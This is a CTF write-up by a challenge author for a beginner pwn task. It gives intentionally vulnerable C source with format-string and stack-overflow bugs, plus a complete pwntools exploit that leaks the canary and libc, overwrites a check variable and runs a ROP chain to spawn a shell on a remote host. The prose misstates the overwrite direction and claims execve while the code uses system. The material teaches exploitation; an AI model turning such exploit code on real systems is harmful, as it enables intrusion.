---
title: "[n00b-CTF 2026]-Pwn/Googogaga"
published: 2026-02-08
description: "Judas, Juda-ah-ah ROP "
tags: ["stack","beginner"]
category: Stack

---
### Overview
This is the challenge that I made in ```n00b CTF``` which is Annual Recruitment CTF of InfoSecIITR for freshers.The goal of the challenge was to get the solvers know about the ```format sting bug and ROP chain```.
All mitigations are enabled

```md
Canary                                  : Enabled
NX                                      : Enabled
PIE                                     : Enabled
RELRO                                   : Full RELRO
Fortify                                 : Not found
```

### Source Code
This is the ```source code``` for the ```challenges```.The ```main()``` function does some religious buffering and
calls a function named ```leak()```.It's kinda obvious from the name that this function will leak the ```address``` which will be used for later exploitation.Then It stores ```0xdeadbeef``` in a ```stack variable``` and then calls the function ```arb_w()```.
Then it performs a check on ```check``` variable and after ```passing check``` it calls ```vuln``` function
The program is exiting via ```_exit``` syscall.
Vuln function introduces plain old powerful ```buffer overflow``` vulnerability.

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void leak() {
  puts("S0 you have come !!!");
  puts("Time for some test!!!");
  puts(("I hope you solved my previous challenge!!!"));
  char leak[0x20] = {0x0};
  if (fgets(leak, 0x12, stdin)) {
    leak[strcspn(leak, "\n")] = '\0';
  }
  printf(leak);
  puts("\nSanity check");
}

void arb_w() {
  puts("Some play stuff!!");
  char input[0x80] = {0x0};
  puts("Enter your desire!!");
  if (fgets(input, 0x52, stdin)) {
    input[strcspn(input, "\n")] = '\0'; // new line remover
  }
  printf(input);
}

void win() { puts(("Sanity check system('/bin/sh')")); }

void vuln() {
  puts(("So how did you reach here? !!!"));
  char some[0x10];
  read(STDIN_FILENO, some, 0x100);
  puts("I hope you had fun!!");
}

int main() {
  // setup
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  leak();
  size_t check = 0xcafebabe;
  arb_w();
  puts("\nDid you realise it?");
  if (check == 0xdeadbeef) {
    puts("Ohho , you still want to fight?");
    vuln();
  }
  puts("\nNo you did not !!");
  _exit(0);
}
```

To get a shell by rop chain there are many methods. One of them is to use ```system``` function in libc,
and if user have ```libc leak``` so it can create a chain using ```pop rdi ; ret``` in libc where system executes ```'/bin/sh'``` as first argument and done!
Another method is to use ```execve syscall``` and ```'/bin/sh'``` as its first argument.
For Beginners, Read the man page  of [execve](https://linux.die.net/man/2/execve) to know more
about this.
I used ```execve``` syscall cuz when I was testing it,```'/bin/sh'``` address was not showing in ```libc address``` in gef. idk why?
So I put ```'/bin/sh'``` on ```stack``` and used that address in ```rdi```.

### Exploitation

Exploitation part is really simple. Leak the ```libc address,stack address``` and ```canary```  then using printf in arb_w, ```overwrite``` the  value of check variable from ```0xdeadbeef``` to ```0xcafebabe``` to pass the check.
And then in ```Vuln``` function Put a rop chain on the ```stack```.
To arbitrary write ```stack address``` using ```format string```,you can do it either manually or so pwntools have a function for automating it.Since,Manually writing it is tough,so I gave enough space in buffer so that even after not using ```'short'``` in function argument  the user can easily ```overwrite``` it. 

```python 
from pwn import *
elf = context.binary = ELF("./googogaga")
context.log_level = "debug"

# io = process()

io = remote("34.66.182.218",6010)

# gdb.attach(io,gdbscript='''
#         #    break *leak+172
#         # break *arb_w
#         # break *vuln+0x47''')

leak_payload = b"%11$p%12$p%17$p"
io.sendline(leak_payload)
io.recvuntil(b"challenge!!!\n")
canary = int(io.recvn(0x12),0x10)
stack_leak = int(io.recvn(0xe),0x10)
libc_leak = int(io.recvn(0xe),0x10)-0x29d90
io.recvuntil(b"desire!!\n")

offset = 0x6
write = {(stack_leak-0x8):0xdeadbeef}
payload = fmtstr_payload(offset,write)

io.sendline(payload)
io.recvuntil(b"here? !!!\n")
pop_rdi =libc_leak+0x000000000002a3e5
system = libc_leak+0x50d70
bin_sh =  stack_leak-0x20
ret = pop_rdi+0x1
rop_payload = b"\x90"*0x18+pack(canary)+b"/bin/sh\x00"+pack(pop_rdi)+pack(bin_sh)+pack(ret)+pack(system)
io.sendline(rop_payload)
io.interactive()
```
Resources:
[format string basic](https://ir0nstone.gitbook.io/notes/binexp/stack/format-string) |
[canariy basic](https://ir0nstone.gitbook.io/notes/binexp/stack/canaries) |
[pwntools docs](https://docs.pwntools.com/en/stable/fmtstr.html) |
